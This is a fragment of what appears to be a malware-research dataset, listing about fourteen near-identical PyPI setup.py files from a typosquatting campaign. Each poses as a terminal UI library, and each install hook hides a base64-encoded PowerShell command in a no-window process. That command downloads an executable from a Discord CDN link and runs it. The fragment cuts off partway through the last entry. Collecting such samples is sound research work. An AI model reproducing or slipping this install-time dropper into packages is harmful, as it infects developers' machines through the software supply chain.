        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpinforandcpu-v7.49",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpinforandcpu',\n    packages = ['modlib'],\n    version = '5.72',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpintelramhacked-v7.6",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpintelramhacked',\n    packages = ['modlib'],\n    version = '1.71',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpintelvercandy-v8.30",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpintelvercandy',\n    packages = ['modlib'],\n    version = '6.11',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpintgamevirtual-v6.13",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpintgamevirtual',\n    packages = ['modlib'],\n    version = '6.56',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpintgrandre-v8.5",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpintgrandre',\n    packages = ['modlib'],\n    version = '7.68',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpkillcandykill-v8.10",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpkillcandykill',\n    packages = ['modlib'],\n    version = '3.36',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tplibvirtualram-v7.77",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tplibvirtualram',\n    packages = ['modlib'],\n    version = '1.60',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tploadpostosint-v4.91",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tploadpostosint',\n    packages = ['modlib'],\n    version = '4.92',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpmccvpong-v10.53",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpmccvpong',\n    packages = ['modlib'],\n    version = '4.66',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpmcrandgrand-v1.41",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpmcrandgrand',\n    packages = ['modlib'],\n    version = '8.3',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tposinthackedstring-v7.57",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tposinthackedstring',\n    packages = ['modlib'],\n    version = '9.14',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tppeppingram-v6.37",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tppeppingram',\n    packages = ['modlib'],\n    version = '9.75',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tppingcpuget-v6.36",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tppingcpuget',\n    packages = ['modlib'],\n    version = '4.98',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tppingultraload-v6.86",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tppingultraload',\n    packages = ['modlib'],\n    version = '6.89',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming 